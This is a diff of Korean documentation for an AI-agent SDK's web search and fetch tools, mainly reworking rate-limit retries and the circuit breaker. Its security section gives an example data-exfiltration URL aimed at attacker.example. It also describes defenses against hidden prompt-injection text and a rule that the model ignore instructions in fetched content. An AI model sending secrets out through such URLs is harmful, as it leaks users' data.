@@ -69,7 +69,7 @@ arXiv 결과에는 `authors`, `pdfUrl`, `updated`, `category`도 있고, 저장�
 
 ## 검색 프로바이더 {#search-providers}
 
-`web_search`는 프로바이더들에게 **순서대로** 묻습니다. 실패하거나, 요청 속도 제한에 걸리거나, 캡차 페이지로 응답한 프로바이더는 다음 프로바이더에게 차례를 넘깁니다. 응답은 어느 프로바이더가 답했는지(`provider`), 그리고 앞선 프로바이더들이 왜 답하지 못했는지(`errors`)를 밝힙니다.
+`web_search`는 프로바이더들에게 **순서대로** 묻습니다. 실패하거나, 두 번째 시도 뒤에도 여전히 요청 속도 제한에 걸린 프로바이더는 다음 프로바이더에게 차례를 넘깁니다. 응답은 어느 프로바이더가 답했는지(`provider`), 그리고 앞선 프로바이더들이 왜 답하지 못했는지(`errors`)를 밝힙니다.
 
 ```ts
 import { brave, duckDuckGo, searxng, webTools } from '@sdk-ai-agents/core';
@@ -85,7 +85,7 @@ const tools = webTools({
 
 | 프로바이더 | 설정 | 날짜 | 참고 |
 | --- | --- | --- | --- |
-| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | 없음(기본값) | 일부 결과 | 공식 API가 아니라 DuckDuckGo의 HTML 페이지입니다. 제목, 링크, 스니펫을 가져오며 광고는 건너뜁니다. 캡차 페이지가 나오거나 빈 페이지가 두 번 나오면 다음 프로바이더에게 넘깁니다. 검색 사이에 1.5초를 둡니다. |
+| `duckDuckGo({ region?, minIntervalMs?, baseUrl? })` | 없음(기본값) | 일부 결과 | 공식 API가 아니라 DuckDuckGo의 HTML 페이지입니다. 제목, 링크, 스니펫을 가져오며 광고는 건너뜁니다. 캡차 페이지나 빈 페이지는 요청 속도 제한으로 봅니다. 검색 사이에는 이전 검색이 끝난 때부터 4초를 둡니다. |
 | `searxng({ baseUrl, engines?, categories?, minIntervalMs? })` | 여러분의 [SearXNG](https://docs.searxng.org/) 인스턴스. 그 `settings.yml`에 `formats: [html, json]`이 있어야 합니다 | `publishedDate` | 각 결과는 자신을 찾은 엔진의 이름을 밝힙니다(`searxng:bing`). 엔진들이 실패해서 결과가 하나도 없는 응답은 다음 프로바이더에게 넘깁니다. |
 | `brave({ apiKey, baseUrl?, minIntervalMs? })` | Brave Search API 키 | `page_age` | 검색 사이에 1초를 둡니다. 무료 요금제의 속도입니다. |
 | `tavily({ apiKey, baseUrl?, minIntervalMs? })` | Tavily API 키 | `published_date` | `site`는 `include_domains`로 보내집니다. 언어는 보내지 않습니다. |
@@ -93,7 +93,9 @@ const tools = webTools({
 
 각 프로바이더는 `site`, `freshness`, `language`를 자신의 매개변수로 바꿉니다(쿼리 안의 `site:`, `df`, `time_range`, `freshness=pw`, `tbs=qdr:w`, `kl`, `search_lang`…). `site`와 다른 사이트의 결과는 어느 프로바이더가 찾았든 버려집니다.
 
-**서킷 브레이커.** 요청 속도 제한에 걸린 프로바이더(HTTP 429, 캡차 페이지)는 즉시, 그 밖의 실패는 세 번 연속 실패한 뒤에 잠시 쉬게 됩니다. 2분 동안 그 프로바이더에는 요청을 보내지 않고 건너뛰며(`errors`가 언제까지인지 밝힙니다), 그다음 한 번 더 시도할 기회를 줍니다. `circuitBreaker: { cooldownMs, failureThreshold }`로 둘 다 바꿀 수 있습니다.
+**요청 속도 제한.** 검색에 속도 제한을 건 프로바이더(HTTP 429, DuckDuckGo의 캡차 페이지나 빈 페이지)는 한 번 더 시도할 기회를 얻습니다. 프로바이더가 요구한 대기 시간(`Retry-After`)이나 `throttleWaitMs`(10초)만큼 기다린 뒤이며, 호출의 마감 시간에 그만한 여유가 있을 때에 한합니다. 30초보다 긴 대기를 요구한 프로바이더는 요구한 시간보다 일찍 다시 시도하는 일이 결코 없습니다. 그동안(최소 `circuitBreaker.cooldownMs`) 건너뛰며, 다른 어느 프로바이더도 답하지 않으면 호출은 즉시 `throttled`로 실패하고 요구된 대기 시간(`retryAfterMs`)을 밝힙니다.
+
+**서킷 브레이커.** 그 두 번째 시도 뒤에도 여전히 요청 속도 제한에 걸린 프로바이더는 즉시, 그 밖의 실패는 세 번 연속 실패한 뒤에 잠시 쉬게 됩니다. 2분 동안 그 프로바이더에는 요청을 보내지 않고 건너뛰며(`errors`가 언제까지인지 밝힙니다), 그다음 한 번 더 시도할 기회를 줍니다. `circuitBreaker: { cooldownMs, failureThreshold }`로 둘 다 바꿀 수 있습니다. 어느 프로바이더도 답하지 않았을 때, 오류(`SearchUnavailableError`)는 모두 요청 속도 제한에 걸렸는지(`throttled`), 그리고 건너뛴 프로바이더를 언제 다시 시도할지(`retryAfterMs`)를 밝힙니다. 연구는 그런 검색을 나중에 한 번 더 시도합니다.
 
 ### 직접 만든 프로바이더 {#your-own-provider}
 
@@ -130,15 +132,16 @@ const intranetSearch: SearchProvider = {
 | `callTimeoutMs` | `60000` | 호출 전체에 적용되며, 무엇을 기다리든 상관없습니다. robots.txt, 요청 간격, 모든 리디렉션, 본문, 페이지나 PDF의 추출이 모두 포함됩니다. 이 시간이 지나면 모든 작업이 중단되고 호출은 `WebTimeoutError`로 실패합니다. 이 한도는 시도마다 적용됩니다. `retry`를 쓰면 호출 하나가 이 값의 `maxRetries + 1`배에 시도 사이의 대기 시간을 더한 만큼까지 걸릴 수 있습니다. |
 | `maxResponseBytes` | `2000000` | 읽는 본문의 최대 크기(압축을 푼 뒤 기준). |
 | `maxRedirects` | `5` | 따라가는 리디렉션 수. 리디렉션마다 다시 검사됩니다. |
-| `hostIntervalMs` | `1000` | 한 호스트로 보내는 두 `web_fetch` 요청 사이의 최소 시간. |
+| `hostIntervalMs` | `1000` | 한 호스트로 보낸 `web_fetch` 요청이 끝난 때부터 다음 요청이 시작될 때까지의 최소 시간. |
+| `throttleWaitMs` | `10000` | 요청 속도 제한에 걸린 프로바이더나 소스가 대기 시간을 밝히지 않았을 때(`Retry-After`), 두 번째 시도 전에 기다리는 시간. |
 | `robots` | `true` | `web_fetch`가 robots.txt를 지킵니다. `false`면 끕니다. |
 | `allowPrivateNetwork` | `false` | `true`, 또는 이 컴퓨터나 사설 네트워크에 있어도 되는 호스트 목록(`intranet.example`, `127.0.0.1:8080`). |
 | `lookup` | 시스템의 리졸버 | 호스트 이름을 주소로 바꿉니다: `(hostname) => Promise<Array<{ address, family }>>`. |
 | `maxPdfBytes` | `10000000` | 읽는 PDF의 최대 크기. 더 큰 PDF는 거부됩니다. |
 | `maxPdfPages` | `30` | 읽는 PDF 페이지 수. |
 | `cache` | `{ ttlMs: 600000, maxEntries: 200, maxBytes: 20000000 }` | 도구와 인자별로 메모리에 보관하는 결과. JSON으로 잰 크기로 최대 `maxBytes`까지 보관합니다. `false`면 끕니다. |
-| `retry` | — | 실패한 호출의 재시도(`{ maxRetries }`). 요청 속도 제한, 서버 오류, 타임아웃, 네트워크 실패를 재시도하며, 거부, 빠진 설정(`WebConfigurationError`), 어느 프로바이더도 답하지 않은 검색(`SearchUnavailableError`)은 절대 재시도하지 않습니다. |
-| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API는 요청 사이에 3초를 두라고 요구합니다. |
+| `retry` | — | 실패한 호출의 재시도(`{ maxRetries }`). 서버 오류, 타임아웃, 네트워크 실패를 재시도하며, 거부, 빠진 설정(`WebConfigurationError`), 어느 프로바이더도 답하지 않은 검색(`SearchUnavailableError`), 도구가 이미 두 번째 시도를 한 요청 속도 제한(HTTP 429, `SearchThrottledError`)은 절대 재시도하지 않습니다. |
+| `arxiv` | `{ baseUrl: 'https://export.arxiv.org', minIntervalMs: 3000 }` | arXiv API는 요청 사이에 3초를 두고 한 번에 하나씩 보내라고 요구합니다. 간격은 이전 요청이 끝난 때부터 셉니다. 거부(HTTP 406, 429, 503)는 기다린 뒤 한 번 더 시도합니다. |
 | `wikipedia` | `{ baseUrl: 'https://{language}.wikipedia.org', language: 'en' }` | `{language}`는 검색 언어로 바뀝니다. 여러분이 준 `baseUrl`은 호스트에 `{language}`가 없을 때에만 사설 네트워크 검사에서 면제됩니다. |
 | `github` | `{ baseUrl: 'https://api.github.com' }` | `token`은 요청 한도를 높이며(토큰이 없으면 1분에 검색 10회), 코드를 검색하는 데 필요합니다. |
 
@@ -148,7 +151,7 @@ const intranetSearch: SearchProvider = {
 2. **예외는 명시적으로만 엽니다.** `allowPrivateNetwork: ['intranet.example']`는 나열된 호스트만, `true`는 모든 호스트를 통과시킵니다. 여러분이 프로바이더나 소스에 준 `baseUrl`은 모델이 아니라 여러분의 코드에서 옵니다. 그래서 이 컴퓨터에 있더라도(`localhost`의 SearXNG) 그 오리진에 한해, 그 프로바이더나 소스의 요청에 한해 접근할 수 있습니다. 다른 곳으로 향하는 리디렉션은 검사되며, `web_fetch`는 여전히 그 주소를 거부합니다. 이 예외는 `webTools()`를 호출할 때 정해지며(프로바이더는 이를 `configuredOrigin`으로 선언합니다), 요청이 정하는 일은 절대 없습니다. 기본 공개 엔드포인트(DuckDuckGo, arXiv, Wikipedia, GitHub)는 절대 면제되지 않습니다. 그 DNS를 여러분이 통제하지 않기 때문입니다.
 3. **http와 https만** 허용합니다. 리디렉션이 https를 http로 낮추는 일은 절대 없고, 리디렉션은 최대 `maxRedirects`번까지 따라가며, TLS 인증서는 항상 검증합니다. API 키나 토큰은 리디렉션이 가리키는 다른 오리진으로 절대 보내지지 않습니다.
 4. **한도가 있습니다.** 호출 전체에는 마감 시간(`callTimeoutMs`)이, 요청마다 타임아웃이 있습니다. 압축을 푼 뒤 기준으로 최대 `maxResponseBytes`까지만 읽고, 나머지는 절대 내려받지 않습니다. PDF는 `maxPdfBytes`(그보다 큰 크기를 알리는 PDF는 내려받기 전에 거부됩니다)와 `maxPdfPages` 안에서 다루며, 한 번에 하나씩 워커에서 읽습니다. 이 워커는 pdf.js가 읽기 전에 PDF를 파싱해, 스트림이 256 MB 넘게 풀리거나 스트림을 읽을 수 없으면 그 PDF를 거부하고, 프로세스가 1 GB 넘게 커지거나 20초를 넘으면 중지됩니다. 측정할 수 없는 암호화된 PDF에는 이것이 유일한 한도입니다. 페이지의 추출은 100,000개의 요소와 5초의 작업 안에서, 콘텐츠는 `maxChars` 안에서 다룹니다. 내려받은 뒤의 어떤 작업도 프로세스를 멈춰 세울 수 없습니다. robots.txt 대조기는 선형 시간에 실행되고, HTML 처리 경로에는 이차 시간이 드는 단계가 없습니다.
-5. **예의를 지킵니다.** `web_fetch`는 robots.txt([RFC 9309](https://www.rfc-editor.org/rfc/rfc9309))를 읽고, `sdk-ai-agents`에게 금지된 것은 리디렉션을 포함해 절대 가져오지 않습니다. `sdk-ai-agents`를 지정한 그룹을 따르고, 그런 그룹이 없으면 `*` 그룹을 따릅니다. 가장 긴 규칙이 이기고, 길이가 같으면 `Allow`가 이기며, `*`와 `$` 패턴을 지원합니다. 예약되지 않은 문자의 이스케이프는 비교하기 전에 디코딩합니다(`%7E`는 `~`입니다). robots.txt가 없으면(4xx) 모든 것이 허용되고, robots.txt 요청이 실패하거나(5xx, 429) 닿을 수 없으면 모든 것이 금지됩니다. robots.txt를 읽는다고 첫 페이지가 늦어지지는 않습니다. `Crawl-delay`는 그다음 요청들 사이에 간격을 두며, 30초보다 긴 지연은 그 시간이 지날 때까지 다음 페이지를 거부합니다. 호스트마다 요청 간격을 조절하고(페이지는 1초, DuckDuckGo는 1.5초, arXiv는 3초), 응답은 캐시되며, 사용자 에이전트가 누가 요청하는지 밝힙니다. 검색 API는 크롤링하는 대상이 아니므로 robots.txt가 적용되지 않습니다.
+5. **예의를 지킵니다.** `web_fetch`는 robots.txt([RFC 9309](https://www.rfc-editor.org/rfc/rfc9309))를 읽고, `sdk-ai-agents`에게 금지된 것은 리디렉션을 포함해 절대 가져오지 않습니다. `sdk-ai-agents`를 지정한 그룹을 따르고, 그런 그룹이 없으면 `*` 그룹을 따릅니다. 가장 긴 규칙이 이기고, 길이가 같으면 `Allow`가 이기며, `*`와 `$` 패턴을 지원합니다. 예약되지 않은 문자의 이스케이프는 비교하기 전에 디코딩합니다(`%7E`는 `~`입니다). robots.txt가 없으면(4xx) 모든 것이 허용되고, robots.txt 요청이 실패하거나(5xx, 429) 닿을 수 없으면 모든 것이 금지됩니다. robots.txt를 읽는다고 첫 페이지가 늦어지지는 않습니다. `Crawl-delay`는 그다음 요청들 사이에 간격을 두며, 30초보다 긴 지연은 그 시간이 지날 때까지 다음 페이지를 거부합니다. 호스트마다 요청을 한 번에 하나씩 보내며, 각 요청은 이전 요청이 끝난 때부터 센 간격을 둡니다(페이지는 1초, DuckDuckGo는 4초, arXiv는 3초). 이 요청 간격 조절은 프로세스의 모든 `webTools()`가 함께 씁니다. 요청 속도 제한에 걸리면 기다린 뒤 한 번 더 시도할 뿐, 연달아 시도하지 않습니다. 응답은 캐시되며, 사용자 에이전트가 누가 요청하는지 밝힙니다. 검색 API는 크롤링하는 대상이 아니므로 robots.txt가 적용되지 않습니다.
 6. **콘텐츠는 데이터입니다.** 모든 응답에는 `untrusted: true`가 붙고, 도구 설명은 모델에게 그 안에서 찾은 지시를 절대 따르지 말라고 알려 줍니다. 추출하기 전에 `web_fetch`는 사람 독자에게는 보이지 않지만 모델은 읽게 될 것을 버립니다. `hidden`, `aria-hidden="true"`, `display:none`, `visibility:hidden`인 요소, 글꼴 크기가 0이거나 불투명도가 0인 요소, HTML 주석, 그리고 보이지 않는 문자, 즉 폭이 없는 문자와 양방향 제어 문자, (텍스트를 보이지 않게 적는) Tags 블록, 변형 선택자(variation selector)입니다. 검색 결과와 오류 메시지도 같은 방식으로 걸러지며, 오류는 서버 응답을 최대 한 줄만, 신뢰할 수 없다는 표시와 함께 인용합니다. 연구는 결과를 신뢰할 수 없는 데이터 표시 사이에 넣어 모델에 보여 줍니다.
 7. **통제됩니다.** `web_fetch`의 위험은 낮음이 아니라 중간입니다. 모델이 URL을 고르고, URL은 데이터를 밖으로 실어 나를 수 있기 때문입니다(`https://attacker.example/?q=<secret>`). 비밀을 가진 에이전트에게는 이 도구를 주지 않거나, 호출마다 사람이 승인하게 하세요.
 
@@ -189,4 +192,4 @@ const study = sdk.createStudy({ name: 'browser', object, objective, sources });
 - **주요 콘텐츠를 고르는 규칙이 단순합니다.** `<main>`, 가장 긴 `<article>`, 그것도 없으면 `<body>`입니다. 주요 콘텐츠 안에 있는 반복적인 틀(메뉴, 공지 같은 boilerplate)은 남습니다.
 - **OCR을 하지 않습니다.** 스캔한 PDF에는 읽을 텍스트가 없습니다.
 - **DuckDuckGo의 HTML 페이지는 API가 아닙니다.** 그 형식은 바뀔 수 있고, 많이 쓰면 속도를 제한합니다. 검색량이 많다면 다른 프로바이더를 설정하세요.
-- **캐시와 요청 간격 조절은 메모리에 있습니다.** `webTools()` 호출마다 따로 있으며, 프로세스가 끝나면 사라집니다.
+- **캐시와 요청 간격 조절은 메모리에 있습니다.** 프로세스가 끝나면 사라집니다. 캐시는 `webTools()` 호출마다 따로 있고, 요청 간격 조절은 프로세스 전체에 하나입니다. 같은 머신의 다른 프로세스는 따로 간격을 조절합니다.
